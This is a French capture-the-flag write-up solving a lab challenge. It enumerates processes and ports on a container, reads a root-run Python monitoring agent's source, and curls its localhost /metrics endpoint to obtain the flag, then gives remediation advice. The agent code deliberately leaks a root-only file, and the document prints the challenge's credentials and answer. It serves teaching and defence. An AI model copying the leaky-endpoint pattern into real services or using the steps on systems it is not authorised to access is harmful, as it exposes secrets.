# Writeup — Local Service Recon

**Catégorie** : Sandbox  
**Difficulté** : Easy  
**Points** : 150  
**Flag** : `CTF{metrics_endpoint_exposed_locally}`

## Contexte

Un agent de monitoring Python tourne en arrière-plan sur le serveur et écoute **uniquement sur localhost** (`127.0.0.1:8080`). Le flag est exposé dans son endpoint `/metrics`, inaccessible depuis l'extérieur. Le joueur doit d'abord énumérer les services internes, identifier l'agent, inspecter son code source, puis l'interroger depuis la machine elle-même.

## Connexion

```bash
ssh ctf@<TARGET_IP> -p 5003
# password: ctf2026
```

## Étapes de résolution

### 1. Énumération des processus en cours

Après connexion SSH :

```bash
ctf@container:~$ ps aux
```

Sortie (extrait) :
```
root         1  0.0  0.0  /bin/bash /start.sh
root         7  0.1  0.3  python3 /opt/ctf/app.py
root        13  0.0  0.0  sshd: ...
```

On voit un processus `python3 /opt/ctf/app.py` tournant en root.

### 2. Énumération des ports en écoute

```bash
ctf@container:~$ ss -tlnp
```

Sortie :
```
State   Recv-Q  Send-Q  Local Address:Port  Peer Address:Port
LISTEN  0       128     0.0.0.0:22          0.0.0.0:*
LISTEN  0       5       127.0.0.1:8080      0.0.0.0:*
```

Le port `8080` écoute uniquement sur `127.0.0.1` — inaccessible de l'extérieur.

### 3. Inspection du code source de l'agent

Le fichier est lisible par l'utilisateur `ctf` :

```bash
ctf@container:~$ cat /opt/ctf/app.py
```

Sortie (extrait) :
```python
@app.route("/metrics")
def metrics():
    try:
        secret = open("/root/flag.txt").read().strip()
    except Exception:
        secret = "unavailable"
    ...
    return (
        f"# monitoring-agent internal metrics\n"
        f"# internal_token: {secret}\n"
    ), ...

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, debug=False)
```

L'endpoint `/metrics` lit `/root/flag.txt` (fichier root-only) et l'inclut dans sa réponse. L'agent tourne en root, donc il peut lire ce fichier.

### 4. Interrogation de l'endpoint depuis la machine

Puisque le service écoute sur `127.0.0.1`, on doit le requêter depuis la machine elle-même :

```bash
ctf@container:~$ curl http://127.0.0.1:8080/metrics
```

Sortie :
```
# monitoring-agent internal metrics — 2026-05-18T14:32:01
process_status 1
checks_passed 3
memory_ok 1
# internal_token: CTF{metrics_endpoint_exposed_locally}
```

On peut aussi explorer d'autres routes avant de trouver `/metrics` :

```bash
ctf@container:~$ curl http://127.0.0.1:8080/
# monitoring-agent v0.3
# routes: /health  /status  /metrics

ctf@container:~$ curl http://127.0.0.1:8080/health
{"status":"ok"}
```

## Explication des vulnérabilités

### Service interne exposant des secrets

L'agent de monitoring s'exécute en tant que `root` et expose le contenu de `/root/flag.txt` (chmod 400) via son endpoint `/metrics`. Même si le fichier est inaccessible en lecture directe pour l'utilisateur `ctf`, le service l'expose via HTTP.

Ce pattern est courant dans les vraies infrastructures : des agents de monitoring (Prometheus exporters, health checks) tournent avec des privilèges élevés et exposent des métriques qui peuvent contenir des secrets (tokens, certificats, configurations).

### Code source lisible

Le script `/opt/ctf/app.py` est lisible (mode 644) par tous les utilisateurs. Dans ce challenge c'est intentionnel (aide à la progression), mais en production, le code source d'un service exposant des secrets ne devrait pas être accessible.

## Recommandations de remédiation

1. **Ne jamais inclure de secrets dans des endpoints de monitoring** — utiliser des tokens opaques ou des checksums
2. **Restreindre l'accès au code source** : `chmod 700 /opt/service/` ou `chmod 600 app.py`
3. **Séparer les privilèges** : l'agent ne doit pas tourner en root si possible. Utiliser un utilisateur dédié avec accès minimal aux fichiers qu'il doit lire
4. **Authentifier les endpoints internes** : même sur localhost, un token d'authentification évite les accès non autorisés depuis d'autres processus

## Références

- OWASP — Security Misconfiguration (A05:2021) : https://owasp.org/Top10/A05_2021-Security_Misconfiguration/
- MITRE ATT&CK T1046 (Network Service Discovery) : https://attack.mitre.org/techniques/T1046/
- Prometheus security best practices : https://prometheus.io/docs/operating/security/
